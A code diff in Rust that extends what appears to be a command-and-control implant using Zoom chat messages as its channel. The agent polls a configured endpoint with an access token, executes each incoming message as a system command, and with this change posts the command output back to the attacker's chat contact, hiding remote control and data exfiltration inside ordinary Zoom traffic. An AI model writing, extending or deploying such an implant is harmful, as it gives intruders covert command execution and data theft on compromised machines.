@@ -4,7 +4,9 @@ use serde_json::{Value};
 use serde;
 use crate::operation::{execute};
 use std::{thread, time::Duration};
-use crate::main::config_parser;
+use crate::parser::config_parser;
+use crate::Estruct::{AtItems,RichText,Payload,configuration};
+
 
 
 use crate::Estruct::{Message, Root};
@@ -66,15 +68,17 @@ pub async fn httpGetRequest(host: &str, access_token:&str) -> Result<(),Error> {
                 //let new_command = command.pop().unwrap();
                 
                 println!("New command is {}",new_command.message);
-                if new_command.message.starts_with("access_token") {
+                if new_command.message.starts_with("access_token") || new_command.message.starts_with("output") {
 
                 }
                 else {
                     //let new_msg = command.pop().unwrap();
                     let resp : String = execute(&new_command.message);
+                    httpPostRequest(resp).await;
+                    println!("Execution done");
  
                     thread::sleep(Duration::from_secs(1)); 
-                    println!("final response is {}",resp);
+                    //println!("final response is {}",resp);
 
                 }
                 count_new_message+=1;
@@ -93,13 +97,42 @@ pub async fn httpGetRequest(host: &str, access_token:&str) -> Result<(),Error> {
     Ok(())
 } 
 
-/*pub async fun httpPostRequest(resp: String) -> Result<(),Error>{
+async fn httpPostRequest(resp: String) -> Result<(),Error>{
     let client = reqwest::Client::new();
     let mut config: configuration = config_parser();
     let host : String = config.endpoint;
     let mut access_token : String = config.access_token;
+    let email : String = config.email;
+    println!("Inside httpPost");
+    let final_resp = String::from("output") + &resp;
 
 
+    // crafting the payload to send over zoom API
+
+    let rich_texts = RichText {
+        start_position: 0,
+        end_position: 1,
+        format_type: String::from("Paragraph"),
+        format_attr: String::from("h1"),
+    };
+    let at_itemss = AtItems {
+        at_contact: email.clone(),
+        at_type: 2,
+        end_position: 8,
+        start_position: 0
+    };
+    let payload = Payload {
+        at_items: vec![at_itemss],
+        rich_text: vec![rich_texts],
+        message: final_resp,
+        to_contact: email.clone(),
+
+    };
+     
+    let response = client.post(host).json(&payload).header(String::from("Authorization"),access_token).send().await?;
+    
+    let status = response.status();
+    println!("status is {}",status);
+    Ok(())
 
 }
-    */
